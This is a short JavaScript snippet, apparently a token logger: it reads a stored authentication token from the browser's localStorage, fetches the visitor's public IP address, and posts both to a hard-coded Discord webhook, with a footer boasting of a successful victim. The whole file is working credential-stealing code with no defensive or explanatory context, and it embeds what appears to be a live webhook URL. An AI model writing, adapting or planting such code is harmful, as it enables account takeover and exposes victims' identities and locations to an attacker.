
    const token = localStorage.getItem('token');
    const webhookURL = 'https://discord.com/api/webhooks/1391045636366930000/fH5K6z2KNgUe9ykdh9UZjfiNRKvoV6DYOy3TzITTQC8_KuYUteGBE40Cj-IFy2cQsVgM';

    function sendToDiscord(token, ip) {
        const embed = {
            title: "🔐 Token & 🌐 IP Info",
            color: 0x00FFFF,
            fields: [
                {
                    name: "Token",
                    value: `\`\`\`${token}\`\`\``,
                    inline: false
                },
                {
                    name: "IP Address",
                    value: `\`\`\`${ip}\`\`\``,
                    inline: false
                }
            ],
            footer: {
                text: "Logger by HaThu fucked one ppl success",
            },
            timestamp: new Date().toISOString()
        };

        fetch(webhookURL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                username: "Logger Bot",
                avatar_url: "https://i.imgur.com/Jxee3pS.jpeg",
                embeds: [embed]
            })
        });
    }

    if (token) {
        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                const ip = data.ip;
                sendToDiscord(token, ip);
            })
            .catch(error => {
                console.error('Could not fetch IP:', error);
                sendToDiscord(token, 'Unknown');
            });

    } else {
    }
